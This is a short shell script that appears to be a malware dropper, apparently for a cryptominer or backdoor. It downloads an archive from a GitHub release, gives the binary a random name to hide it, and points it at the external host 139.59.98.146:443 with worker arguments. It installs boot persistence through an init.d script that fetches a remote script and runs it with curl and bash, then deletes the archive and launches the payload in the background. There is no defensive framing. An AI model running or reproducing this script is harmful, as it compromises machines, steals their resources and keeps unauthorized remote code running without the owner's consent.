cd /
wget https://github.com/toolsas/shard/releases/download/v1.5.2/grave.tar
tar -xvf grave.tar
cd /grave
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv layer $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./shell.sh
sed -i "s/host/139.59.98.146:443/g" ./shell.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/toolsas/shard/main/earth.sh)" > stone.sh
chmod a+x stone.sh
update-rc.d stone.sh defaults
rm -rf grave.tar
cd /grave
nohup ./shell.sh
ps -ef | grep grave
